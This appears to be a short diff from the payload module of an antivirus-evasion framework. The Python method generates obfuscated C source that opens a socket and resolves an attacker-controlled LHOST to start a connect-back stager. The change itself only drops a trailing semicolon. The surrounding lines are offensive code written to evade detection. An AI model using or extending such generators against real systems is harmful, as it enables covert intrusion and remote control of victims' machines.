@@ -152,7 +152,7 @@ class PayloadModule:
         my_socket_name = evasion_helpers.randomString()
         code += "SOCKET %s() { struct hostent * %s; struct sockaddr_in %s; SOCKET %s;" % (wsconnect_name, target_name, sock_name, my_socket_name)
         code += "%s = socket(AF_INET, SOCK_STREAM, 0);" %(my_socket_name)
-        code += "if (%s == INVALID_SOCKET) %s(%s);" %(my_socket_name, punt_name, my_socket_name);
+        code += "if (%s == INVALID_SOCKET) %s(%s);" %(my_socket_name, punt_name, my_socket_name)
         code += "%s = gethostbyname(\"%s\");" %(target_name, self.required_options["LHOST"][0])
         code += "if (%s == NULL) %s(%s);" %(target_name, punt_name, my_socket_name)
         code += "memcpy(&%s.sin_addr.s_addr, %s->h_addr, %s->h_length);" %(sock_name, target_name, target_name)
